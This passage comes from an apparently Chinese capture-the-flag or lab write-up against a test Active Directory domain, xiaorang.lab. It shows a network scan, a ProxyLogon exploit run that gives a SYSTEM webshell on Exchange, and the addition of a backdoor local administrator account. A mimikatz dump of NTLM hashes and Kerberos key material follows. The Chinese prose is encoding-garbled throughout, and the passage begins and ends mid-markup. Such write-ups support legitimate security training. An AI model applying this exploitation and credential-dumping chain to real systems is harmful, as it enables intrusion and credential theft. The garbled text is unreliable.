class="hljs-number">0</span>-<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">255</span><br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s]     generate_ip_range_full<br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s]     è§£æCIDR <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>/<span class="hljs-number">24</span> -&gt; IPèŒƒå›´ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">0</span>-<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">255</span><br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s]     æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: <span class="hljs-number">256</span><br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s]     å¼€å§‹ä¸»æœºæ‰«æ<br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s]     ä½¿ç”¨æœåŠ¡æ’ä»¶: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle<br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s] [*] ç›®æ ‡ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>     å­˜æ´» (ICMP)<br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s] [*] ç›®æ ‡ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>      å­˜æ´» (ICMP)<br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s] [*] ç›®æ ‡ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span>     å­˜æ´» (ICMP)<br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s] [*] ç›®æ ‡ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>      å­˜æ´» (ICMP)<br>[<span class="hljs-number">4</span>.<span class="hljs-number">9</span>s]     å­˜æ´»ä¸»æœºæ•°é‡: <span class="hljs-number">4</span><br>[<span class="hljs-number">4</span>.<span class="hljs-number">9</span>s]     æœ‰æ•ˆç«¯å£æ•°é‡: <span class="hljs-number">233</span><br>[<span class="hljs-number">4</span>.<span class="hljs-number">9</span>s] [*] ç«¯å£å¼€æ”¾ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>:<span class="hljs-number">80</span><br>[<span class="hljs-number">4</span>.<span class="hljs-number">9</span>s] [*] ç«¯å£å¼€æ”¾ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>:<span class="hljs-number">22</span><br>[<span class="hljs-number">4</span>.<span class="hljs-number">9</span>s] [*] ç«¯å£å¼€æ”¾ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span>:<span class="hljs-number">139</span><br>[<span class="hljs-number">4</span>.<span class="hljs-number">9</span>s] [*] ç«¯å£å¼€æ”¾ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span>:<span class="hljs-number">135</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] ç«¯å£å¼€æ”¾ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>:<span class="hljs-number">8000</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] ç«¯å£å¼€æ”¾ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span>:<span class="hljs-number">445</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] ç«¯å£å¼€æ”¾ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>:<span class="hljs-number">135</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] ç«¯å£å¼€æ”¾ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>:<span class="hljs-number">445</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] ç«¯å£å¼€æ”¾ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>:<span class="hljs-number">389</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] ç«¯å£å¼€æ”¾ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>:<span class="hljs-number">139</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] ç«¯å£å¼€æ”¾ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>:<span class="hljs-number">88</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] ç«¯å£å¼€æ”¾ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">808</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] ç«¯å£å¼€æ”¾ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">443</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] ç«¯å£å¼€æ”¾ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">139</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] ç«¯å£å¼€æ”¾ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">445</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] ç«¯å£å¼€æ”¾ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">135</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] ç«¯å£å¼€æ”¾ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">81</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] ç«¯å£å¼€æ”¾ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">80</span><br>[<span class="hljs-number">5</span>.<span class="hljs-number">0</span>s] [*] ç«¯å£å¼€æ”¾ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">8172</span><br>[<span class="hljs-number">6</span>.<span class="hljs-number">0</span>s]     æ‰«æå®Œæˆ, å‘ç° <span class="hljs-number">19</span> ä¸ªå¼€æ”¾ç«¯å£<br>[<span class="hljs-number">6</span>.<span class="hljs-number">0</span>s]     å­˜æ´»ç«¯å£æ•°é‡: <span class="hljs-number">19</span><br>[<span class="hljs-number">6</span>.<span class="hljs-number">0</span>s]     å¼€å§‹æ¼æ´æ‰«æ<br>[<span class="hljs-number">6</span>.<span class="hljs-number">1</span>s] [*] ç½‘ç«™æ ‡é¢˜ http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>        çŠ¶æ€ç :<span class="hljs-number">200</span> é•¿åº¦:<span class="hljs-number">19813</span>  æ ‡é¢˜:lumia<br>[<span class="hljs-number">6</span>.<span class="hljs-number">1</span>s]     POCåŠ è½½å®Œæˆ: æ€»å…±<span class="hljs-number">387</span>ä¸ªï¼ŒæˆåŠŸ<span class="hljs-number">387</span>ä¸ªï¼Œå¤±è´¥<span class="hljs-number">0</span>ä¸ª<br>[<span class="hljs-number">6</span>.<span class="hljs-number">1</span>s] [*] NetInfo æ‰«æç»“æœ<br>ç›®æ ‡ä¸»æœº: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span><br>ä¸»æœºå: XIAORANG-PC<br>å‘ç°çš„ç½‘ç»œæ¥å£:<br>   IPv4åœ°å€:<br>      â””â”€ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span><br>[<span class="hljs-number">6</span>.<span class="hljs-number">1</span>s] [*] NetInfo æ‰«æç»“æœ<br>ç›®æ ‡ä¸»æœº: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span><br>ä¸»æœºå: XIAORANG-EXC01<br>å‘ç°çš„ç½‘ç»œæ¥å£:<br>   IPv4åœ°å€:<br>      â””â”€ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span><br>[<span class="hljs-number">6</span>.<span class="hljs-number">1</span>s] [*] NetInfo æ‰«æç»“æœ<br>ç›®æ ‡ä¸»æœº: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span><br>ä¸»æœºå: XIAORANG-WIN16<br>å‘ç°çš„ç½‘ç»œæ¥å£:<br>   IPv4åœ°å€:<br>      â””â”€ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span><br>[<span class="hljs-number">6</span>.<span class="hljs-number">1</span>s] [+] NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>      DC:XIAORANG-WIN16.xiaorang.lab      Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span><br>[<span class="hljs-number">6</span>.<span class="hljs-number">2</span>s] [+] NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span>     XIAORANG\XIAORANG-PC          <br>[<span class="hljs-number">6</span>.<span class="hljs-number">2</span>s] [+] NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>      XIAORANG-EXC01.xiaorang.lab         Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span><br>[<span class="hljs-number">6</span>.<span class="hljs-number">2</span>s]     ç³»ç»Ÿä¿¡æ¯ <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span> [Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span>]<br>[<span class="hljs-number">6</span>.<span class="hljs-number">4</span>s] [*] ç½‘ç«™æ ‡é¢˜ http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>:<span class="hljs-number">8000</span>   çŠ¶æ€ç :<span class="hljs-number">302</span> é•¿åº¦:<span class="hljs-number">0</span>      æ ‡é¢˜:æ— æ ‡é¢˜ é‡å®šå‘åœ°å€: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>:<span class="hljs-number">8000</span>/login.html<br>[<span class="hljs-number">6</span>.<span class="hljs-number">5</span>s] [*] ç½‘ç«™æ ‡é¢˜ http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">81</span>      çŠ¶æ€ç :<span class="hljs-number">403</span> é•¿åº¦:<span class="hljs-number">1157</span>   æ ‡é¢˜:<span class="hljs-number">403</span> - ç¦æ­¢è®¿é—®: è®¿é—®è¢«æ‹’ç»ã€‚<br>[<span class="hljs-number">6</span>.<span class="hljs-number">6</span>s] [*] ç½‘ç«™æ ‡é¢˜ http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>:<span class="hljs-number">8000</span>/login.html çŠ¶æ€ç :<span class="hljs-number">200</span> é•¿åº¦:<span class="hljs-number">5662</span>   æ ‡é¢˜:Lumia ERP<br>[<span class="hljs-number">7</span>.<span class="hljs-number">4</span>s] [*] ç½‘ç«™æ ‡é¢˜ http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>         çŠ¶æ€ç :<span class="hljs-number">403</span> é•¿åº¦:<span class="hljs-number">0</span>      æ ‡é¢˜:æ— æ ‡é¢˜<br>[<span class="hljs-number">7</span>.<span class="hljs-number">8</span>s] [*] ç½‘ç«™æ ‡é¢˜ https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>        çŠ¶æ€ç :<span class="hljs-number">302</span> é•¿åº¦:<span class="hljs-number">0</span>      æ ‡é¢˜:æ— æ ‡é¢˜ é‡å®šå‘åœ°å€: https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>/owa/<br>[<span class="hljs-number">8</span>.<span class="hljs-number">5</span>s] [*] ç½‘ç«™æ ‡é¢˜ https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>/owa/   çŠ¶æ€ç :<span class="hljs-number">200</span> é•¿åº¦:<span class="hljs-number">28237</span>  æ ‡é¢˜:Outlook<br>[<span class="hljs-number">10</span>.<span class="hljs-number">0</span>s] [*] ç½‘ç«™æ ‡é¢˜ https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">8172</span>   çŠ¶æ€ç :<span class="hljs-number">404</span> é•¿åº¦:<span class="hljs-number">0</span>      æ ‡é¢˜:æ— æ ‡é¢˜<br>[<span class="hljs-number">1</span>m51s]     æ‰«æå·²å®Œæˆ: <span class="hljs-number">36</span>/<span class="hljs-number">36</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°ä»¥ä¸‹ä¿¡æ¯</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>æœ¬æœº<br><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>      DC:XIAORANG-WIN16.xiaorang.lab      Windows Server <span class="hljs-number">2016</span>åŸŸæ§<br><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span>     XIAORANG\XIAORANG-PC          <br><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>      XIAORANG-EXC01.xiaorang.lab         Windows Server <span class="hljs-number">2016</span> <br></code></pre></td></tr></table></figure><p>å¹¶ä¸”è¿˜å‘ç° 172.22.3.9 è¿™å°æœºå™¨æœ‰ Outlook</p><h1 id="Microsoft-Exchange-Proxylogon-åˆ©ç”¨"><a href="#Microsoft-Exchange-Proxylogon-åˆ©ç”¨" class="headerlink" title="Microsoft Exchange Proxylogon åˆ©ç”¨"></a>Microsoft Exchange Proxylogon åˆ©ç”¨</h1><p><img src="https://img.dkdun.cn/v1/2025/12/44a79ef8b7000ea8.png"></p><p>Exchange é‚®ç®±ï¼Œéœ€è¦è´¦æˆ·å¯†ç ç™»å½•ï¼Œå°è¯• ProxyLogon æ‹¿ shell å†™åé—¨è´¦æˆ·</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs cmd">â””â”€# proxychains -q python2 proxylogon.py <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span> administrator@xiaorang.lab<br><br>  _____                     _<br> |  __ \                   | |<br> | |__) | __ _____  ___   _| |     ___   __ _  ___  _ __<br> |  ___/ &#x27;__/ _ \ \/ / | | | |    / _ \ / _` |/ _ \| &#x27;_ \<br> | |   | | | (_) &gt;  &lt;| |_| | |___| (_) | (_| | (_) | | | |<br> |_|   |_|  \___/_/\_ \__, |______\___/ \__, |\___/|_| |_|<br>                       __/ |             __/ |<br>                      |___/             |___/<br><br>Original PoC by https://github.com/testanull<br><span class="hljs-function">Author: @<span class="hljs-title">Haus3c</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Target</span>: 172.22.3.9</span><br><span class="hljs-function">=============================</span><br><span class="hljs-function">[+] <span class="hljs-title">Attempting</span> <span class="hljs-title">SSRF</span></span><br><span class="hljs-function"><span class="hljs-title">DN</span>: /<span class="hljs-title">o</span>=<span class="hljs-title">XIAORANG</span> <span class="hljs-title">LAB</span>/<span class="hljs-title">ou</span>=<span class="hljs-title">Exchange</span> <span class="hljs-title">Administrative</span> <span class="hljs-title">Group</span> (<span class="hljs-title">FYDIBOHF23SPDLT</span>)/<span class="hljs-title">cn</span>=<span class="hljs-title">Recipients</span>/<span class="hljs-title">cn</span>=8<span class="hljs-title">ca6ff254802459d9f63ee916eabb487</span>-<span class="hljs-title">Administrat</span></span><br><span class="hljs-function"><span class="hljs-title">SID</span>: <span class="hljs-title">S</span>-1-5-21-533686307-2117412543-4200729784-500</span><br><span class="hljs-function">[+] <span class="hljs-title">SSRF</span> <span class="hljs-title">Successful</span>!</span><br><span class="hljs-function">[+] <span class="hljs-title">Attempting</span> <span class="hljs-title">Arbitrary</span> <span class="hljs-title">File</span> <span class="hljs-title">Write</span></span><br><span class="hljs-function"><span class="hljs-title">SessionID</span>: 23<span class="hljs-title">b19d1f</span>-<span class="hljs-title">c638</span>-4<span class="hljs-title">d75</span>-83<span class="hljs-title">d0</span>-74<span class="hljs-title">d85b8d356d</span></span><br><span class="hljs-function"><span class="hljs-title">CanaryToken</span>: <span class="hljs-title">GkMzES3LNUi6llExSnZZ6_LKm</span>-<span class="hljs-title">x5790IJH9pqaX_2gYs0WxfcWZBqRKicw80OlhHtZ9z4N1IQMI</span>.</span><br><span class="hljs-function"><span class="hljs-title">OABId</span>: 6<span class="hljs-title">d8fb74b</span>-8477-43<span class="hljs-title">ee</span>-83<span class="hljs-title">ba</span>-0<span class="hljs-title">b119205e85f</span></span><br><span class="hljs-function">[+] <span class="hljs-title">Success</span>! <span class="hljs-title">Entering</span> <span class="hljs-title">webshell</span>. <span class="hljs-title">Type</span> &#x27;<span class="hljs-title">quit</span>&#x27; <span class="hljs-title">or</span> &#x27;<span class="hljs-title">exit</span>&#x27; <span class="hljs-title">to</span> <span class="hljs-title">escape</span>.</span><br><span class="hljs-function"></span><br><span class="hljs-function"># <span class="hljs-title">whoami</span></span><br><span class="hljs-function"><span class="hljs-title">nt</span> <span class="hljs-title">authority</span>\<span class="hljs-title">system</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"># <span class="hljs-title">net</span> <span class="hljs-title">user</span> <span class="hljs-title">butt3rf1y</span> <span class="hljs-title">butt3r_f1y</span>! /<span class="hljs-title">add</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"># <span class="hljs-title">net</span> <span class="hljs-title">localgroup</span> <span class="hljs-title">administrators</span> <span class="hljs-title">butt3rf1y</span> /<span class="hljs-title">add</span></span><br></code></pre></td></tr></table></figure><p>rdp ç™»è¿›å»æ‹¿ flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/b8c00cb4a45bbef0.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag02</span>: flag&#123;<span class="hljs-number">70</span>a3a53a-dc66-<span class="hljs-number">45</span>bb-a7d0-<span class="hljs-number">75</span>edf74d006d&#125;<br></code></pre></td></tr></table></figure><h1 id="é€šè¿‡-WirteDacl-æƒé™æ‰“-DCSync"><a href="#é€šè¿‡-WirteDacl-æƒé™æ‰“-DCSync" class="headerlink" title="é€šè¿‡ WirteDacl æƒé™æ‰“ DCSync"></a>é€šè¿‡ WirteDacl æƒé™æ‰“ DCSync</h1><p>æŸ¥çœ‹ä»»åŠ¡ç®¡ç†å™¨å‘ç°è¿˜æœ‰å¦ä¸€ä¸ªç”¨æˆ·åœ¨çº¿</p><p><img src="https://img.dkdun.cn/v1/2025/12/4725e10409efd551.png"></p><p>ç”¨ minikataz æŠ“ä¸€ä¸‹ç”¨æˆ· hashï¼ŒæŠ“åˆ°åŸŸå†… Zhangtong å’Œ XIAORANG-EXC01$ æœºå™¨ç”¨æˆ·çš„å“ˆå¸Œ</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs cmd">Authentication Id : <span class="hljs-number">0</span> ; <span class="hljs-number">2025799</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">001</span>ee947)<br>Session           : RemoteInteractive from <span class="hljs-number">2</span><br>User Name         : Zhangtong<br>Domain            : XIAORANG<br>Logon Server      : XIAORANG-WIN16<br>Logon <span class="hljs-built_in">Time</span>        : <span class="hljs-number">2025</span>/<span class="hljs-number">9</span>/<span class="hljs-number">7</span> <span class="hljs-number">14</span>:<span class="hljs-number">32</span>:<span class="hljs-number">28</span><br>SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">533686307</span>-<span class="hljs-number">2117412543</span>-<span class="hljs-number">4200729784</span>-<span class="hljs-number">1147</span><br>        msv :<br>         [<span class="hljs-number">00000003</span>] Primary<br>         * Username : Zhangtong<br>         * Domain   : XIAORANG<br>         * NTLM     : <span class="hljs-number">22</span>c7f81993e96ac83ac2f3f1903de8b4<br>         * SHA1     : <span class="hljs-number">4</span>d205f752e28b0a13e7a2da2a956d46cb9d9e01e<br>         * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b<br>        tspkg :<br>        wdigest :<br>         * Username : Zhangtong<br>         * Domain   : XIAORANG<br>         * Password : (null)<br>        kerberos :<br>         * Username : Zhangtong<br>         * Domain   : XIAORANG.LAB<br>         * Password : (null)<br>        ssp :<br>        credman :<br>        <br>Authentication Id : <span class="hljs-number">0</span> ; <span class="hljs-number">1867480</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">001</span>c7ed8)<br>Session           : Interactive from <span class="hljs-number">2</span><br>User Name         : DWM-<span class="hljs-number">2</span><br>Domain            : Window Manager<br>Logon Server      : (null)<br>Logon <span class="hljs-built_in">Time</span>        : <span class="hljs-number">2025</span>/<span class="hljs-number">9</span>/<span class="hljs-number">7</span> <span class="hljs-number">14</span>:<span class="hljs-number">32</span>:<span class="hljs-number">22</span><br>SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">90</span>-<span class="hljs-number">0</span>-<span class="hljs-number">2</span><br>        msv :<br>         [<span class="hljs-number">00000003</span>] Primary<br>         * Username : XIAORANG-EXC01$<br>         * Domain   : XIAORANG<br>         * NTLM     : bc2aaa56d33a9080b44fbe2d44b520b5<br>         * SHA1     : <span class="hljs-number">67</span>ae100419abf0f216f927571cb12ee55c209132<br>        tspkg :<br>        wdigest :<br>         * Username : XIAORANG-EXC01$<br>         * Domain   : XIAORANG<br>         * Password : (null)<br>        kerberos :<br>         * Username : XIAORANG-EXC01$<br>         * Domain   : xiaorang.lab<br>         * Password : b5 <span class="hljs-number">92</span> <span class="hljs-number">7</span>e <span class="hljs-number">8</span>c bd <span class="hljs-number">05</span> <span class="hljs-number">90</span> <span class="hljs-number">45</span> <span class="hljs-number">5</span>d c3 d4 ee <span class="hljs-number">2</span>f bf a3 <span class="hljs-number">04</span> <span class="hljs-number">65</span> <span class="hljs-number">8</span>b <span class="hljs-number">06</span> f6 b5 <span class="hljs-number">48</span> <span class="hljs-number">52</span> <span class="hljs-number">7</span>f a9 <span class="hljs-number">33</span> <span class="hljs-number">12</span> <span class="hljs-number">87</span> a8 f5 <span class="hljs-number">94</span> <span class="hljs-number">38</span> <span class="hljs-number">90</span> <span class="hljs-number">13</span> b1 <span class="hljs-number">5</span>d ab f0 <span class="hljs-number">73</span> <span class="hljs-number">63</span> <span class="hljs-number">81</span> <span class="hljs-number">79</span> <span class="hljs-number">8</span>e <span class="hljs-number">7</span>d d9 <span class="hljs-number">08</span> <span class="hljs-number">02</span> <span class="hljs-number">1</span>d ba <span class="hljs-number">7</span>f f8 b9 a5 <span class="hljs-number">97</span> <span class="hljs-number">23</span> <span class="hljs-number">97</span> <span class="hljs-number">3</span>c <span class="hljs-number">9</span>c <span class="hljs-number">1</span>d b0 a8 <span class="hljs-number">89</span> b7 <span class="hljs-number">48</span> ba <span class="hljs-number">52</span> <span class="hljs-number">10</span> <span class="hljs-number">1</span>d e7 <span class="hljs-number">80</span> cb a4 fd <span class="hljs-number">9</span>e <span class="hljs-number">2</span>a db <span class="hljs-number">5</span>a <span class="hljs-built_in">cd</span> <span class="hljs-number">40</span> ae <span class="hljs-number">2</span>a c7 <span class="hljs-number">5</span>d <span class="hljs-number">00</span> fb <span class="hljs-number">6</span>d c5 <span class="hljs-number">41</span> a0 a7 <span class="hljs-number">17</span> c3 <span class="hljs-number">4</span>c <span class="hljs-number">5</span>f e4 <span class="hljs-number">3</span>e f0 <span class="hljs-number">5</span>a <span class="hljs-number">10</span> a9 <span class="hljs-number">8</span>e f0 <span class="hljs-number">97</span> <span class="hljs-number">24</span> f9 <span class="hljs-number">69</span> <span class="hljs-number">56</span> bf ed <span class="hljs-number">2</span>b <span class="hljs-number">54</span> <span class="hljs-number">34</span> <span class="hljs-number">5</span>b <span class="hljs-number">65</span> <span class="hljs-number">6</span>d af <span class="hljs-number">96</span> <span class="hljs-number">15</span> cb <span class="hljs-number">4</span>d b9 <span class="hljs-number">6</span>a b9 <span class="hljs-number">5</span>b <span class="hljs-number">42</span> <span class="hljs-number">2</span>e a3 <span class="hljs-number">7</span>d df e6 <span class="hljs-number">1</span>c <span class="hljs-number">9</span>b <span class="hljs-number">28</span> ca <span class="hljs-number">04</span> <span class="hljs-number">82</span> <span class="hljs-number">4</span>a <span class="hljs-number">80</span> f2 <span class="hljs-number">5</span>d a9 <span class="hljs-number">72</span> <span class="hljs-number">2</span>b <span class="hljs-number">6</span>f e0 <span class="hljs-number">21</span> f7 c0 d8 <span class="hljs-number">11</span> <span class="hljs-number">8</span>f f0 <span class="hljs-number">6</span>d <span class="hljs-number">15</span> <span class="hljs-number">98</span> <span class="hljs-number">10</span> <span class="hljs-number">48</span> d6 <span class="hljs-number">6</span>c f8 e7 e9 <span class="hljs-number">92</span> <span class="hljs-number">36</span> <span class="hljs-number">9</span>e <span class="hljs-number">1</span>e <span class="hljs-number">9</span>c e2 e7 dc a5 f4 fe a8 ed <span class="hljs-number">4</span>b <span class="hljs-number">1</span>d <span class="hljs-number">7</span>a <span class="hljs-number">5</span>d <span class="hljs-number">8</span>f <span class="hljs-number">55</span> f5 <span class="hljs-number">1</span>e <span 